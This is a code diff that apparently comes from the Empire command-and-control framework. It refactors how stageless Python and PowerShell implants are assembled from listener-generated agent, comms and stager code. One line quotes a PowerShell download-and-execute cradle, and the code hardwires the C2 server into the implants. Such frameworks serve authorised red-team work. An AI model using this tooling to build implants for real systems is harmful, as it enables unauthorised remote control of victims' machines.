@@ -650,105 +650,74 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         script = script.replace("BASE64_BLOB_GOES_HERE", file_encoded)
         return script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
 
-    def generate_stageless(self, options):
-        listener_name = options["Listener"]["Value"]
-        if options["Language"]["Value"] == "ironpython":
+    def generate_python_stageless(self, active_listener, language):
+        server = active_listener.options["Host"]["Value"]
+
+        if language == "ironpython":
             language = "python"
             version = "ironpython"
         else:
-            language = options["Language"]["Value"]
             version = ""
+
+        agent_code = active_listener.generate_agent(
+            active_listener.options, language=language, version=version
+        )
+
+        comms_code = active_listener.generate_comms(
+            active_listener.options, language=language
+        )
+
+        stager_code = (
+            active_listener.generate_stager(
+                active_listener.options, language=language, encrypt=False, encode=False
+            )
+            .replace("exec(agent_code, globals())", "")
+            .replace("stage = Stage()", f"stage = Stage()\nserver='{server}'")
+        )
+
+        if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
+            full_agent = "\n".join([agent_code, stager_code, comms_code])
+        else:
+            full_agent = "\n".join([agent_code, stager_code])
+        return full_agent
+
+    def generate_powershell_stageless(self, active_listener, language):
+        agent_code = active_listener.generate_agent(
+            active_listener.options, language=language
+        )
+
+        comms_code = active_listener.generate_comms(
+            active_listener.options, language=language
+        )
+
+        stager_code = active_listener.generate_stager(
+            active_listener.options, language=language, encrypt=False, encode=False
+        )
+
+        launcher_code = active_listener.generate_launcher(
+            encode=False, language=language
+        ).replace(
+            "$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX",
+            "",
+        )
+
+        return "\n".join([launcher_code, comms_code, stager_code, agent_code])
+
+    def generate_stageless(self, options):
+        listener_name = options["Listener"]["Value"]
+        language = options["Language"]["Value"].lower()
 
         active_listener = self.listener_service.get_active_listener_by_name(
             listener_name
         )
 
-        chars = string.ascii_uppercase + string.digits
-        session_id = helpers.random_string(length=8, charset=chars)
-        staging_key = active_listener.options["StagingKey"]["Value"]
-        delay = active_listener.options["DefaultDelay"]["Value"]
-        jitter = active_listener.options["DefaultJitter"]["Value"]
-        profile = active_listener.options["DefaultProfile"]["Value"]
-        kill_date = active_listener.options["KillDate"]["Value"]
-        working_hours = active_listener.options["WorkingHours"]["Value"]
-        lost_limit = active_listener.options["DefaultLostLimit"]["Value"]
-        if "Host" in active_listener.options:
-            host = active_listener.options["Host"]["Value"]
-        else:
-            host = ""
+        if language.lower() in ["python", "ironpython"]:
+            return self.generate_python_stageless(active_listener, language)
 
-        with SessionLocal.begin() as db:
-            agent = self.agent_service.create_agent(
-                db,
-                session_id,
-                "0.0.0.0",
-                delay,
-                jitter,
-                profile,
-                kill_date,
-                working_hours,
-                lost_limit,
-                listener=listener_name,
-                language=language,
-            )
+        if language.lower() == "powershell":
+            return self.generate_powershell_stageless(active_listener, language)
 
-            self.agent_communication_service.add_agent_to_cache(agent)
-
-            # update the agent with this new information
-            self.agent_communication_service.update_agent_sysinfo(
-                db,
-                session_id,
-                listener=listener_name,
-                internal_ip="0.0.0.0",
-                username="blank\\blank",
-                hostname="blank",
-                os_details="blank",
-                high_integrity=0,
-                process_name="blank",
-                process_id=99999,
-                language_version=2,
-                language=language,
-                architecture="AMD64",
-            )
-
-            # Send initial task for sysinfo into the database
-            self.agent_task_service.create_task_sysinfo(db, agent, 0)
-
-            # get the agent's session key
-            session_key = agent.session_key
-
-            agent_code = active_listener.generate_agent(
-                active_listener.options, language=language, version=version
-            )
-            comms_code = active_listener.generate_comms(
-                active_listener.options, language=language
-            )
-
-            stager_code = active_listener.generate_stager(
-                active_listener.options, language=language, encrypt=False, encode=False
-            )
-
-            if options["Language"]["Value"] == "powershell":
-                launch_code = f"\nInvoke-Empire -Servers @('{host}') -StagingKey '{staging_key}' -SessionKey '{session_key}' -SessionID '{session_id}' -WorkingHours '{working_hours}' -KillDate '{kill_date}';"
-                return comms_code + "\n" + agent_code + "\n" + launch_code
-
-            if options["Language"]["Value"] in ["python", "ironpython"]:
-                stager_code = stager_code.replace(
-                    "return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))",
-                    f"return b'{session_id}'",
-                )
-
-                stager_code = replace_execute_function(stager_code, session_key)
-                launch_code = ""
-
-                if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
-                    full_agent = "\n".join(
-                        [agent_code, stager_code, comms_code, launch_code]
-                    )
-                else:
-                    full_agent = "\n".join([agent_code, stager_code, launch_code])
-                return full_agent
-            return None
+        return None
 
     def generate_go_stageless(self, options, listener_name=None):
         if not listener_name:
@@ -792,19 +761,3 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         return self.main_menu.go_compiler.compile_stager(
             template_vars, "stager", goos="windows", goarch="amd64"
         )
-
-
-def replace_execute_function(code, session_key):
-    code_first = code.split("def execute(self):")[0]
-    code_last = code.split("agent.run()")[1]
-
-    new_function = f"""
-    def execute(self):
-        self.key = b'{session_key}'
-        self.packet_handler.key = self.key
-        agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server, session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
-        self.packet_handler.agent = agent
-        agent.run()
-"""
-
-    return code_first + new_function + code_last
